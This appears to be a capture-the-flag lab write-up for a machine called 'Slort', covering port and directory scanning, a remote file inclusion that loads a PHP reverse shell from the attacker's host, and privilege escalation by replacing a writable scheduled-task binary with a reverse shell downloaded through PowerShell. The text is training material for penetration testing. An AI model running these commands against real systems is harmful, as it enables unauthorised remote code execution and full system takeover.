# Slort

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.233.53 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 21:12 +08
Nmap scan report for 192.168.233.53
Host is up (0.17s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
4443/tcp  open  pharos
5040/tcp  open  unknown
7680/tcp  open  pando-pub
8080/tcp  open  http-proxy
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

### FTP Anonymous Fail

Does not allow anonymous logins.

### RFI -> User Shell

Port 4443 and 8080 host the same service:

<figure><img src="../../../.gitbook/assets/image (3107).png" alt=""><figcaption></figcaption></figure>

I ran a `gobuster` scan on the site and found a few directories:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.233.53:8080 -t 100                  
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.233.53:8080
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/06/30 21:18:11 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 345] [--> http://192.168.233.53:8080/img/]
/site                 (Status: 301) [Size: 346] [--> http://192.168.233.53:8080/site/]
<TRUNCATED>
```

The `/site` directory contained a basic corporate page, but the most interesting part was the URL:

<figure><img src="../../../.gitbook/assets/image (651).png" alt=""><figcaption></figcaption></figure>

This looks like it's vulnerable to a file inclusion exploit. I tested this and it is RFI for this case:

<figure><img src="../../../.gitbook/assets/image (2386).png" alt=""><figcaption></figcaption></figure>

We can grab a PHP Reverse shell for Windows from this page:

{% embed url="https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php" %}

Afterwards, we just need to execute it:

```
$ curl http://192.168.233.53:8080/site/index.php?page=http://192.168.45.161/rev.php
```

<figure><img src="../../../.gitbook/assets/image (2300).png" alt=""><figcaption></figcaption></figure>

We can then grab the user flag.

## Privilege Escalation

### Cronjob -> SYSTEM Shell

The `C:\` directory contained a `Backup` folder that looked interesting:

```
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\

07/20/2020  07:08 AM    <DIR>          Backup
12/07/2019  02:14 AM    <DIR>          PerfLogs
05/04/2022  01:06 AM    <DIR>          Program Files
12/03/2021  09:22 AM    <DIR>          Program Files (x86)
12/03/2021  09:29 AM    <DIR>          Users
05/04/2022  01:52 AM    <DIR>          Windows
06/12/2020  08:11 AM    <DIR>          xampp

C:\Backup>dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\Backup

07/20/2020  07:08 AM    <DIR>          .
07/20/2020  07:08 AM    <DIR>          ..
06/12/2020  07:45 AM            11,304 backup.txt
06/12/2020  07:45 AM                73 info.txt
06/23/2020  07:49 PM            73,802 TFTP.EXE
```

`info.txt` basically told us what to do:

```
C:\Backup>type info.txt
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt

C:\Backup>icacls TFTP.EXE
icacls TFTP.EXE
TFTP.EXE BUILTIN\Users:(I)(F)
         BUILTIN\Administrators:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         NT AUTHORITY\Authenticated Users:(I)(M)

Successfully processed 1 files; Failed processing 0 files
```

We can modify the `TFTP.EXE` file and replace it with our own reverse shell to get a SYSTEM shell after the scheduled task executes.

```
C:\Backup>move TFTP.EXE old.exe
move TFTP.EXE old.exe
        1 file(s) moved.

C:\Backup>powershell -c wget 192.168.45.161/shell.exe -Outfile TFTP.EXE 
powershell -c wget 192.168.45.161/shell.exe -Outfile TFTP.EXE
```

After a few minutes, the task would execute and give us a administrator reverse shell.&#x20;

<figure><img src="../../../.gitbook/assets/image (2503).png" alt=""><figcaption></figcaption></figure>

Rooted!
